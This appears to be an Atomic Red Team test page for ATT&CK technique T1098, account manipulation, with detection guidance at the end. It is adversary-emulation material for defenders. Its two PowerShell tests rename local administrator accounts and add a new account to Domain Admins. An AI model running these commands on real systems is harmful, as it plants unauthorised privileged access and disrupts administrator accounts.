# T1098 - Account Manipulation
Adversaries may manipulate accounts to maintain access to victim systems. Account manipulation may consist of any action that preserves adversary access to a compromised account, such as modifying credentials or permission groups. These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to bypass password duration policies and preserve the life of compromised credentials. In order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain.

## Atomic Tests

#Import the Module before running the tests.
Import-Module /Users/0x6c/AtomicRedTeam/atomics/invoke-atomicredteam/Invoke-AtomicRedTeam.psd1 - Force

### Atomic Test #1 - Admin Account Manipulate
Manipulate Admin Account Name

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
$x = Get-Random -Minimum 2 -Maximum 9999
$y = Get-Random -Minimum 2 -Maximum 9999
$z = Get-Random -Minimum 2 -Maximum 9999
$w = Get-Random -Minimum 2 -Maximum 9999
Write-Host HaHaHa_$x$y$z$w

$hostname = (Get-CIMInstance CIM_ComputerSystem).Name

$fmm = Get-CimInstance -ClassName win32_group -Filter "name = 'Administrators'" | Get-CimAssociatedInstance -Association win32_groupuser | Select Name

foreach($member in $fmm) {
    if($member -like "*Administrator*") {
        Rename-LocalUser -Name $member.Name -NewName "HaHaHa_$x$y$z$w"
        Write-Host "Successfully Renamed Administrator Account on" $hostname
        }
    }
```

Invoke-AtomicTest T1098 -TestNumbers 1

### Atomic Test #2 - Domain Account and Group Manipulate
Create a random atr-nnnnnnnn account and add it to a domain group (by default, Domain Admins). 

The quickest way to run it is against a domain controller, using `-Session` of `Invoke-AtomicTest`. Alternatively,
you need to install PS Module ActiveDirectory (in prereqs) and run the script with appropriare AD privileges to 
create the user and alter the group. Automatic installation of the dependency requires an elevated session, 
and is unlikely to work with Powershell Core (untested).

If you consider running this test against a production Active Directory, the good practise is to create a dedicated
service account whose delegation is given onto a dedicated OU for user creation and deletion, as well as delegated
as group manager of the target group.

Example: `Invoke-AtomicTest -Session $session 'T1098' -TestNames "Domain Account and Group Manipulate" -InputArgs @{"group" = "DNSAdmins" }`

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
$x = Get-Random -Minimum 2 -Maximum 99
$y = Get-Random -Minimum 2 -Maximum 99
$z = Get-Random -Minimum 2 -Maximum 99
$w = Get-Random -Minimum 2 -Maximum 99

Import-Module ActiveDirectory
$account = "#{account_prefix}-$x$y$z"
New-ADUser -Name $account -GivenName "Test" -DisplayName $account -SamAccountName $account -Surname $account -Enabled:$False #{create_args}
Add-ADGroupMember "#{group}" $account
```

Invoke-AtomicTest T1098 -TestNumbers 2

## Detection
Collect events that correlate with changes to account objects and/or permissions on systems and the domain, such as event IDs 4738, 4728 and 4670.(Citation: Microsoft User Modified Event)(Citation: Microsoft Security Event 4670)(Citation: Microsoft Security Event 4670) Monitor for modification of accounts in correlation with other suspicious activity. Changes may occur at unusual times or from unusual systems. Especially flag events where the subject and target accounts differ(Citation: InsiderThreat ChangeNTLM July 2017) or that include additional flags such as changing a password without knowledge of the old password.(Citation: GitHub Mimikatz Issue 92 June 2017)

Monitor for use of credentials at unusual times or to unusual systems or services. This may also correlate with other suspicious activity.

Monitor for unusual permissions changes that may indicate excessively broad permissions being granted to compromised accounts.